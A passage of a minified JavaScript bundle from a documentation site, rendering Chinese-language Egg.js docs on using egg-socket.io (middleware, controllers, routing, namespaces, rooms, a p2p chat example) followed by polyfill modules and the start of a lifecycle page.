proxy_pass   http://127.0.0.1:7001;\n\n  # http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_bind\n  # proxy_bind       $remote_addr transparent;\n}',lang:"unknown"}),r.a.createElement("h2",{id:"\u4f7f\u7528-egg-socketio"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-egg-socketio","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 egg-socket.io"),r.a.createElement("p",null,"\u5f00\u542f ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," \u7684\u9879\u76ee\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"chat\n\u251c\u2500\u2500 app\n\u2502\xa0\xa0 \u251c\u2500\u2500 extend\n\u2502\xa0\xa0 \u2502\xa0\xa0 \u2514\u2500\u2500 helper.js\n\u2502\xa0\xa0 \u251c\u2500\u2500 io\n\u2502\xa0\xa0 \u2502\xa0\xa0 \u251c\u2500\u2500 controller\n\u2502\xa0\xa0 \u2502\xa0\xa0 \u2502\xa0\xa0 \u2514\u2500\u2500 default.js\n\u2502\xa0\xa0 \u2502\xa0\xa0 \u2514\u2500\u2500 middleware\n\u2502\xa0\xa0 \u2502\xa0\xa0     \u251c\u2500\u2500 connection.js\n\u2502\xa0\xa0 \u2502\xa0\xa0     \u2514\u2500\u2500 packet.js\n\u2502\xa0\xa0 \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2514\u2500\u2500 package.json",lang:"unknown"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u6ce8\u610f\uff1a\u5bf9\u5e94\u7684\u6587\u4ef6\u90fd\u5728 app/io \u76ee\u5f55\u4e0b")),r.a.createElement("h3",{id:"middleware"},r.a.createElement(l["AnchorLink"],{to:"#middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Middleware"),r.a.createElement("p",null,"\u4e2d\u95f4\u4ef6\u6709\u5982\u4e0b\u4e24\u79cd\u573a\u666f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Connection"),r.a.createElement("li",null,"Packet")),r.a.createElement("p",null,"\u5176\u914d\u7f6e\u4e8e\u5404\u4e2a\u547d\u540d\u7a7a\u95f4\u4e0b\uff0c\u6839\u636e\u4e0a\u8ff0\u4e24\u79cd\u573a\u666f\u5206\u522b\u53d1\u751f\u4f5c\u7528\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u542f\u7528\u4e86\u6846\u67b6\u4e2d\u95f4\u4ef6\uff0c\u5219\u4f1a\u53d1\u73b0\u9879\u76ee\u4e2d\u6709\u4ee5\u4e0b\u76ee\u5f55\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/middleware"),"\uff1a\u6846\u67b6\u4e2d\u95f4\u4ef6"),r.a.createElement("li",null,r.a.createElement("code",null,"app/io/middleware"),"\uff1a\u63d2\u4ef6\u4e2d\u95f4\u4ef6")),r.a.createElement("p",null,"\u533a\u522b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6846\u67b6\u4e2d\u95f4\u4ef6\u57fa\u4e8e http \u6a21\u578b\u8bbe\u8ba1\uff0c\u5904\u7406 http \u8bf7\u6c42\u3002"),r.a.createElement("li",null,"\u63d2\u4ef6\u4e2d\u95f4\u4ef6\u57fa\u4e8e socket \u6a21\u578b\u8bbe\u8ba1\uff0c\u5904\u7406 socket.io \u8bf7\u6c42\u3002")),r.a.createElement("p",null,"\u867d\u7136\u6846\u67b6\u901a\u8fc7\u63d2\u4ef6\u5c3d\u91cf\u7edf\u4e00\u4e86\u5b83\u4eec\u7684\u98ce\u683c\uff0c\u4f46\u52a1\u5fc5\u6ce8\u610f\uff0c\u5b83\u4eec\u7684\u4f7f\u7528\u573a\u666f\u662f\u4e0d\u4e00\u6837\u7684\u3002\u8be6\u60c5\u53c2\u89c1 issue\uff1a",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/1416"},"#1416")),r.a.createElement("h4",{id:"connection"},r.a.createElement(l["AnchorLink"],{to:"#connection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Connection"),r.a.createElement("p",null,"\u5728\u6bcf\u4e00\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u6216\u8005\u9000\u51fa\u65f6\u53d1\u751f\u4f5c\u7528\uff0c\u6545\u800c\u6211\u4eec\u901a\u5e38\u5728\u8fd9\u4e00\u6b65\u8fdb\u884c\u6388\u6743\u8ba4\u8bc1\uff0c\u5bf9\u8ba4\u8bc1\u5931\u8d25\u7684\u5ba2\u6237\u7aef\u505a\u51fa\u76f8\u5e94\u7684\u5904\u7406"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/middleware/connection.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    ctx.socket.emit('res', 'connected!');\n    await next();\n    // execute when disconnect.\n    console.log('disconnection!');\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u8e22\u51fa\u7528\u6237\u793a\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"const tick = (id, msg) => {\n  logger.debug('#tick', id, msg);\n  socket.emit(id, msg);\n  app.io.of('/').adapter.remoteDisconnect(id, true, (err) => {\n    logger.error(err);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u540c\u65f6\uff0c\u9488\u5bf9\u5f53\u524d\u7684\u8fde\u63a5\u4e5f\u53ef\u4ee5\u7b80\u5355\u5904\u7406\uff1a"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/middleware/connection.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    if (true) {\n      ctx.socket.disconnect();\n      return;\n    }\n    await next();\n    console.log('disconnection!');\n  };\n};",lang:"js"}),r.a.createElement("h4",{id:"packet"},r.a.createElement(l["AnchorLink"],{to:"#packet","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Packet"),r.a.createElement("p",null,"\u4f5c\u7528\u4e8e\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\uff08\u6bcf\u4e00\u6761\u6d88\u606f\uff09\uff1b\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u6d88\u606f\u505a\u9884\u5904\u7406\uff0c\u53c8\u6216\u8005\u662f\u5bf9\u52a0\u5bc6\u6d88\u606f\u7684\u89e3\u5bc6\u7b49\u64cd\u4f5c"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/middleware/packet.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    ctx.socket.emit('res', 'packet received!');\n    console.log('packet:', ctx.packet);\n    await next();\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"controller"},r.a.createElement(l["AnchorLink"],{to:"#controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement("p",null,"Controller \u5bf9\u5ba2\u6237\u7aef\u53d1\u9001\u7684 event \u8fdb\u884c\u5904\u7406\uff1b\u7531\u4e8e\u5176\u7ee7\u627f\u4e8e ",r.a.createElement("code",null,"egg.Contoller"),", \u62e5\u6709\u5982\u4e0b\u6210\u5458\u5bf9\u8c61:"),r.a.createElement("ul",null,r.a.createElement("li",null,"ctx"),r.a.createElement("li",null,"app"),r.a.createElement("li",null,"service"),r.a.createElement("li",null,"config"),r.a.createElement("li",null,"logger")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u8be6\u60c5\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"../basics/controller"},"Controller")," \u6587\u6863")),r.a.createElement(o["a"],{code:"// {app_root}/app/io/controller/default.js\n'use strict';\n\nconst Controller = require('egg').Controller;\n\nclass DefaultController extends Controller {\n  async ping() {\n    const { ctx, app } = this;\n    const message = ctx.args[0];\n    await ctx.socket.emit('res', `Hi! I've got your message: ${message}`);\n  }\n}\n\nmodule.exports = DefaultController;\n\n// or async functions\n\nexports.ping = async function () {\n  const message = this.args[0];\n  await this.socket.emit('res', `Hi! I've got your message: ${message}`);\n};",lang:"js"}),r.a.createElement("h3",{id:"router"},r.a.createElement(l["AnchorLink"],{to:"#router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router"),r.a.createElement("p",null,"\u8def\u7531\u8d1f\u8d23\u5c06 socket \u8fde\u63a5\u7684\u4e0d\u540c events \u5206\u53d1\u5230\u5bf9\u5e94\u7684 controller\uff0c\u6846\u67b6\u7edf\u4e00\u4e86\u5176\u4f7f\u7528\u65b9\u5f0f"),r.a.createElement(o["a"],{code:"// {app_root}/app/router.js\n\nmodule.exports = (app) => {\n  const { router, controller, io } = app;\n\n  // default\n  router.get('/', controller.home.index);\n\n  // socket.io\n  io.of('/').route('server', io.controller.home.server);\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")),r.a.createElement("p",null,"nsp \u6709\u5982\u4e0b\u7684\u7cfb\u7edf\u4e8b\u4ef6:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"disconnecting")," doing the disconnect"),r.a.createElement("li",null,r.a.createElement("code",null,"disconnect")," connection has disconnected."),r.a.createElement("li",null,r.a.createElement("code",null,"error")," Error occurred")),r.a.createElement("h3",{id:"namespaceroom"},r.a.createElement(l["AnchorLink"],{to:"#namespaceroom","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Namespace/Room"),r.a.createElement("h4",{id:"namespace-nsp"},r.a.createElement(l["AnchorLink"],{to:"#namespace-nsp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Namespace (nsp)"),r.a.createElement("p",null,'namespace \u901a\u5e38\u610f\u5473\u5206\u914d\u5230\u4e0d\u540c\u7684\u63a5\u5165\u70b9\u6216\u8005\u8def\u5f84\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u6ca1\u6709\u6307\u5b9a nsp\uff0c\u5219\u9ed8\u8ba4\u5206\u914d\u5230 "/" \u8fd9\u4e2a\u9ed8\u8ba4\u7684\u547d\u540d\u7a7a\u95f4\u3002'),r.a.createElement("p",null,"\u5728 socket.io \u4e2d\u6211\u4eec\u901a\u8fc7 ",r.a.createElement("code",null,"of")," \u6765\u5212\u5206\u547d\u540d\u7a7a\u95f4\uff1b\u9274\u4e8e nsp \u901a\u5e38\u662f\u9884\u5b9a\u4e49\u4e14\u76f8\u5bf9\u56fa\u5b9a\u7684\u5b58\u5728\uff0c\u6846\u67b6\u5c06\u5176\u8fdb\u884c\u4e86\u5c01\u88c5\uff0c\u91c7\u7528\u914d\u7f6e\u7684\u65b9\u5f0f\u6765\u5212\u5206\u4e0d\u540c\u7684\u547d\u540d\u7a7a\u95f4\u3002"),r.a.createElement(o["a"],{code:"// socket.io\nvar nsp = io.of('/my-namespace');\nnsp.on('connection', function (socket) {\n  console.log('someone connected');\n});\nnsp.emit('hi', 'everyone!');\n\n// egg\nexports.io = {\n  namespace: {\n    '/': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"room"},r.a.createElement(l["AnchorLink"],{to:"#room","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Room"),r.a.createElement("p",null,"room \u5b58\u5728\u4e8e nsp \u4e2d\uff0c\u901a\u8fc7 join/leave \u65b9\u6cd5\u6765\u52a0\u5165\u6216\u8005\u79bb\u5f00; \u6846\u67b6\u4e2d\u4f7f\u7528\u65b9\u6cd5\u76f8\u540c\uff1b"),r.a.createElement(o["a"],{code:"const room = 'default_room';\n\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    ctx.socket.join(room);\n    ctx.app.io\n      .of('/')\n      .to(room)\n      .emit('online', { msg: 'welcome', id: ctx.socket.id });\n    await next();\n    console.log('disconnection!');\n  };\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a")," \u6bcf\u4e00\u4e2a socket \u8fde\u63a5\u90fd\u4f1a\u62e5\u6709\u4e00\u4e2a\u968f\u673a\u4e14\u4e0d\u53ef\u9884\u6d4b\u7684\u552f\u4e00 id ",r.a.createElement("code",null,"Socket#id"),"\uff0c\u5e76\u4e14\u4f1a\u81ea\u52a8\u52a0\u5165\u5230\u4ee5\u8fd9\u4e2a ",r.a.createElement("code",null,"id")," \u547d\u540d\u7684 room \u4e2d"),r.a.createElement("h2",{id:"\u5b9e\u4f8b"},r.a.createElement(l["AnchorLink"],{to:"#\u5b9e\u4f8b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b9e\u4f8b"),r.a.createElement("p",null,"\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," \u6765\u505a\u4e00\u4e2a\u652f\u6301 p2p \u804a\u5929\u7684\u5c0f\u4f8b\u5b50"),r.a.createElement("h3",{id:"client"},r.a.createElement(l["AnchorLink"],{to:"#client","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"client"),r.a.createElement("p",null,"UI \u76f8\u5173\u7684\u5185\u5bb9\u4e0d\u91cd\u590d\u5199\u4e86\uff0c\u901a\u8fc7 window.socket \u8c03\u7528\u5373\u53ef"),r.a.createElement(o["a"],{code:"// browser\nconst log = console.log;\n\nwindow.onload = function () {\n  // init\n  const socket = io('/', {\n    // \u5b9e\u9645\u4f7f\u7528\u4e2d\u53ef\u4ee5\u5728\u8fd9\u91cc\u4f20\u9012\u53c2\u6570\n    query: {\n      room: 'demo',\n      userId: `client_${Math.random()}`,\n    },\n\n    transports: ['websocket'],\n  });\n\n  socket.on('connect', () => {\n    const id = socket.id;\n\n    log('#connect,', id, socket);\n\n    // \u76d1\u542c\u81ea\u8eab id \u4ee5\u5b9e\u73b0 p2p \u901a\u8baf\n    socket.on(id, (msg) => {\n      log('#receive,', msg);\n    });\n  });\n\n  // \u63a5\u6536\u5728\u7ebf\u7528\u6237\u4fe1\u606f\n  socket.on('online', (msg) => {\n    log('#online,', msg);\n  });\n\n  // \u7cfb\u7edf\u4e8b\u4ef6\n  socket.on('disconnect', (msg) => {\n    log('#disconnect', msg);\n  });\n\n  socket.on('disconnecting', () => {\n    log('#disconnecting');\n  });\n\n  socket.on('error', () => {\n    log('#error');\n  });\n\n  window.socket = socket;\n};",lang:"js"}),r.a.createElement("h4",{id:"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f"},r.a.createElement(l["AnchorLink"],{to:"#\u5fae\u4fe1\u5c0f\u7a0b\u5e8f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f"),r.a.createElement("p",null,"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u63d0\u4f9b\u7684 API \u4e3a WebSocket \uff0c\u800c socket.io \u662f Websocket \u7684\u4e0a\u5c42\u5c01\u88c5\uff0c\u6545\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u7528\u5c0f\u7a0b\u5e8f\u7684 API \u8fde\u63a5\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c ",r.a.createElement(l["Link"],{to:"https://github.com/wxsocketio/weapp.socket.io"},"weapp.socket.io")," \u7684\u5e93\u6765\u9002\u914d\u3002"),r.a.createElement("p",null,"\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"// \u5c0f\u7a0b\u5e8f\u7aef\u793a\u4f8b\u4ee3\u7801\nconst io = require('./yout_path/weapp.socket.io.js');\n\nconst socket = io('http://localhost:8000');\n\nsocket.on('connect', function () {\n  console.log('connected');\n});\n\nsocket.on('news', (d) => {\n  console.log('received news: ', d);\n});\n\nsocket.emit('news', {\n  title: 'this is a news',\n});",lang:"js"}),r.a.createElement("h3",{id:"server"},r.a.createElement(l["AnchorLink"],{to:"#server","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"server"),r.a.createElement("p",null,"\u4ee5\u4e0b\u662f demo \u7684\u90e8\u5206\u4ee3\u7801\u5e76\u89e3\u91ca\u4e86\u5404\u4e2a\u65b9\u6cd5\u7684\u4f5c\u7528"),r.a.createElement("h4",{id:"config"},r.a.createElement(l["AnchorLink"],{to:"#config","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"config"),r.a.createElement(o["a"],{code:"// {app_root}/config/config.${env}.js\nexports.io = {\n  namespace: {\n    '/': {\n      connectionMiddleware: ['auth'],\n      packetMiddleware: [], // \u9488\u5bf9\u6d88\u606f\u7684\u5904\u7406\u6682\u65f6\u4e0d\u5b9e\u73b0\n    },\n  },\n\n  // cluster \u6a21\u5f0f\u4e0b\uff0c\u901a\u8fc7 redis \u5b9e\u73b0\u6570\u636e\u5171\u4eab\n  redis: {\n    host: '127.0.0.1',\n    port: 6379,\n  },\n};\n\n// \u53ef\u9009\nexports.redis = {\n  client: {\n    port: 6379,\n    host: '127.0.0.1',\n    password: '',\n    db: 0,\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"helper"),r.a.createElement("p",null,"\u6846\u67b6\u6269\u5c55\u7528\u4e8e\u5c01\u88c5\u6570\u636e\u683c\u5f0f"),r.a.createElement(o["a"],{code:"// {app_root}/app/extend/helper.js\n\nmodule.exports = {\n  parseMsg(action, payload = {}, metadata = {}) {\n    const meta = Object.assign(\n      {},\n      {\n        timestamp: Date.now(),\n      },\n      metadata,\n    );\n\n    return {\n      meta,\n      data: {\n        action,\n        payload,\n      },\n    };\n  },\n};",lang:"js"}),r.a.createElement("p",null,"Format\uff1a"),r.a.createElement(o["a"],{code:"{\n  data: {\n    action: 'exchange',  // 'deny' || 'exchange' || 'broadcast'\n    payload: {},\n  },\n  meta:{\n    timestamp: 1512116201597,\n    client: 'nNx88r1c5WuHf9XuAAAB',\n    target: 'nNx88r1c5WuHf9XuAAAB'\n  },\n}",lang:"js"}),r.a.createElement("h4",{id:"middleware-1"},r.a.createElement(l["AnchorLink"],{to:"#middleware-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"middleware"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," \u4e2d\u95f4\u4ef6\u8d1f\u8d23 socket \u8fde\u63a5\u7684\u5904\u7406"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/middleware/auth.js\n\nconst PREFIX = 'room';\n\nmodule.exports = () => {\n  return async (ctx, next) => {\n    const { app, socket, logger, helper } = ctx;\n    const id = socket.id;\n    const nsp = app.io.of('/');\n    const query = socket.handshake.query;\n\n    // \u7528\u6237\u4fe1\u606f\n    const { room, userId } = query;\n    const rooms = [room];\n\n    logger.debug('#user_info', id, room, userId);\n\n    const tick = (id, msg) => {\n      logger.debug('#tick', id, msg);\n\n      // \u8e22\u51fa\u7528\u6237\u524d\u53d1\u9001\u6d88\u606f\n      socket.emit(id, helper.parseMsg('deny', msg));\n\n      // \u8c03\u7528 adapter \u65b9\u6cd5\u8e22\u51fa\u7528\u6237\uff0c\u5ba2\u6237\u7aef\u89e6\u53d1 disconnect \u4e8b\u4ef6\n      nsp.adapter.remoteDisconnect(id, true, (err) => {\n        logger.error(err);\n      });\n    };\n\n    // \u68c0\u67e5\u623f\u95f4\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5219\u8e22\u51fa\u7528\u6237\n    // \u5907\u6ce8\uff1a\u6b64\u5904 app.redis \u4e0e\u63d2\u4ef6\u65e0\u5173\uff0c\u53ef\u7528\u5176\u4ed6\u5b58\u50a8\u4ee3\u66ff\n    const hasRoom = await app.redis.get(`${PREFIX}:${room}`);\n\n    logger.debug('#has_exist', hasRoom);\n\n    if (!hasRoom) {\n      tick(id, {\n        type: 'deleted',\n        message: 'deleted, room has been deleted.',\n      });\n      return;\n    }\n\n    // \u7528\u6237\u52a0\u5165\n    logger.debug('#join', room);\n    socket.join(room);\n\n    // \u5728\u7ebf\u5217\u8868\n    nsp.adapter.clients(rooms, (err, clients) => {\n      logger.debug('#online_join', clients);\n\n      // \u66f4\u65b0\u5728\u7ebf\u7528\u6237\u5217\u8868\n      nsp.to(room).emit('online', {\n        clients,\n        action: 'join',\n        target: 'participator',\n        message: `User(${id}) joined.`,\n      });\n    });\n\n    await next();\n\n    // \u7528\u6237\u79bb\u5f00\n    logger.debug('#leave', room);\n\n    // \u5728\u7ebf\u5217\u8868\n    nsp.adapter.clients(rooms, (err, clients) => {\n      logger.debug('#online_leave', clients);\n\n      // \u83b7\u53d6 client \u4fe1\u606f\n      // const clientsDetail = {};\n      // clients.forEach(client => {\n      //   const _client = app.io.sockets.sockets[client];\n      //   const _query = _client.handshake.query;\n      //   clientsDetail[client] = _query;\n      // });\n\n      // \u66f4\u65b0\u5728\u7ebf\u7528\u6237\u5217\u8868\n      nsp.to(room).emit('online', {\n        clients,\n        action: 'leave',\n        target: 'participator',\n        message: `User(${id}) leaved.`,\n      });\n    });\n  };\n};",lang:"js"}),r.a.createElement("h4",{id:"controller-1"},r.a.createElement(l["AnchorLink"],{to:"#controller-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"controller"),r.a.createElement("p",null,"P2P \u901a\u4fe1\uff0c\u901a\u8fc7 exchange \u8fdb\u884c\u6570\u636e\u4ea4\u6362"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/controller/nsp.js\nconst Controller = require('egg').Controller;\n\nclass NspController extends Controller {\n  async exchange() {\n    const { ctx, app } = this;\n    const nsp = app.io.of('/');\n    const message = ctx.args[0] || {};\n    const socket = ctx.socket;\n    const client = socket.id;\n\n    try {\n      const { target, payload } = message;\n      if (!target) return;\n      const msg = ctx.helper.parseMsg('exchange', payload, { client, target });\n      nsp.emit(target, msg);\n    } catch (error) {\n      app.logger.error(error);\n    }\n  }\n}\n\nmodule.exports = NspController;",lang:"js"}),r.a.createElement("h4",{id:"router-1"},r.a.createElement(l["AnchorLink"],{to:"#router-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"router"),r.a.createElement(o["a"],{code:"// {app_root}/app/router.js\nmodule.exports = (app) => {\n  const { router, controller, io } = app;\n  router.get('/', controller.home.index);\n\n  // socket.io\n  io.of('/').route('exchange', io.controller.nsp.exchange);\n};",lang:"js"}),r.a.createElement("p",null,"\u5f00\u4e24\u4e2a tab \u9875\u9762\uff0c\u5e76\u8c03\u51fa\u63a7\u5236\u53f0\uff1a"),r.a.createElement(o["a"],{code:"socket.emit('exchange', {\n  target: 'Dkn3UXSu8_jHvKBmAAHW',\n  payload: {\n    msg: 'test',\n  },\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("img",{src:"https://raw.githubusercontent.com/eggjs/egg/master/docs/assets/socketio-console.png",alt:""})),r.a.createElement("h2",{id:"\u53c2\u8003\u94fe\u63a5"},r.a.createElement(l["AnchorLink"],{to:"#\u53c2\u8003\u94fe\u63a5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53c2\u8003\u94fe\u63a5"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://socket.io/"},"socket.io")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io/tree/master/example"},"egg-socket.io example")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs-community/demo-egg-socket.io"},"egg-socket.io demo")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_bind"},"nginx proxy_bind")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},fXgJ:function(e,t,n){"use strict";var a=n("j9mU");e.exports=a.call(Function.call,Object.prototype.hasOwnProperty)},fbrm:function(e,t,n){var a=n("q7Pv");t.f=a},fd2C:function(e,t,n){"use strict";var a=n("pa1g").IteratorPrototype,r=n("tbdv"),l=n("aGbw"),o=n("oi/H"),i=n("GIAz"),c=function(){return this};e.exports=function(e,t,n){var s=t+" Iterator";return e.prototype=r(a,{next:l(1,n)}),o(e,s,!1,!0),i[s]=c,e}},fek2:function(e,t,n){},fhnH:function(e,t,n){var a=n("A0UU");e.exports=function(e,t){var n=a.console;n&&n.error&&(1===arguments.length?n.error(e):n.error(e,t))}},fnGi:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("nzxN");function r(e,t){if("object"!==Object(a["a"])(e)||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var r=n.call(e,t||"default");if("object"!==Object(a["a"])(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}function l(e){var t=r(e,"string");return"symbol"===Object(a["a"])(t)?t:String(t)}},"fpG+":function(e,t,n){var a=n("0mt+"),r=Math.PI/180;a({target:"Math",stat:!0},{radians:function(e){return e*r}})},fruO:function(e,t,n){n("PGq4")},g24z:function(e,t,n){var a=n("nkJX"),r=Math.abs,l=Math.pow,o=l(2,-52),i=l(2,-23),c=l(2,127)*(2-i),s=l(2,-126),u=function(e){return e+1/o-1/o};e.exports=Math.fround||function(e){var t,n,l=r(e),d=a(e);return l<s?d*u(l/s/i)*s*i:(t=(1+i/o)*l,n=t-(t-l),n>c||n!=n?d*(1/0):d*n)}},g2OC:function(e,t,n){"use strict";var a=n("0mt+");a({target:"URL",proto:!0,enumerable:!0},{toJSON:function(){return URL.prototype.toString.call(this)}})},gI5j:function(e,t,n){var a=n("0mt+"),r=180/Math.PI;a({target:"Math",stat:!0},{degrees:function(e){return e*r}})},gRRP:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u6211\u4eec\u5e38\u5e38\u9700\u8981\u5728\u5e94\u7528\u542f\u52a8\u671f\u95f4\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u7b49\u521d\u59cb\u5316\u5b8c\u6210\u540e\u5e94\u7528\u624d\u53ef\u4ee5\u542f\u52a8\u6210\u529f\uff0c\u5e76\u5f00\u59cb\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u5165\u53e3\u6587\u4ef6\uff08",r.a.createElement("code",null,"app.js"),"\uff09\u8fdb\u884c\u542f\u52a8\u8fc7\u7a0b\u81ea\u5b9a\u4e49\uff0c\u8fd9\u4e2a\u6587\u4ef6\u8fd4\u56de\u4e00\u4e2a Boot \u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49 Boot \u7c7b\u4e2d\u7684\u751f\u547d\u5468\u671f\u65b9\u6cd5\u6765\u6267\u884c\u542f\u52a8\u5e94\u7528\u8fc7\u7a0b\u4e2d\u7684\u521d\u59cb\u5316\u5de5\u4f5c\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u8fd9\u4e9b ",r.a.createElement(l["AnchorLink"],{to:"../advanced/loader#life-cycles"},"\u751f\u547d\u5468\u671f\u51fd\u6570"),"\u4f9b\u5f00\u53d1\u4eba\u5458\u5904\u7406\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u914d\u7f6e\u6587\u4ef6\u5373\u5c06\u52a0\u8f7d\uff0c\u8fd9\u662f\u6700\u540e\u52a8\u6001\u4fee\u6539\u914d\u7f6e\u7684\u65f6\u673a\uff08",r.a.createElement("code",null,"configWillLoad"),"\uff09"),r.a.createElement("li",null,"\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u5b8c\u6210\uff08",r.a.createElement("code",null,"configDidLoad"),"\uff09"),r.a.createElement("li",null,"\u6587\u4ef6\u52a0\u8f7d\u5b8c\u6210\uff08",r.a.createElement("code",null,"didLoad"),"\uff09"),r.a.createElement("li",null,"\u63d2\u4ef6\u542f\u52a8\u5b8c\u6bd5\uff08",r.a.createElement("code",null,"willReady"),"\uff09"),r.a.createElement("li",null,"worker \u51c6\u5907\u5c31\u7eea\uff08",r.a.createElement("code",null,"didReady"),"\uff09"),r.a.createElement("li",null,"\u5e94\u7528\u542f\u52a8\u5b8c\u6210\uff08",r.a.createElement("code",null,"serverDidReady"),"\uff09"),r.a.createElement("li",null,"\u5e94\u7528\u5373\u5c06\u5173\u95ed\uff08",r.a.createElement("code",null,"beforeClose"),"\uff09")),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"app.js")," 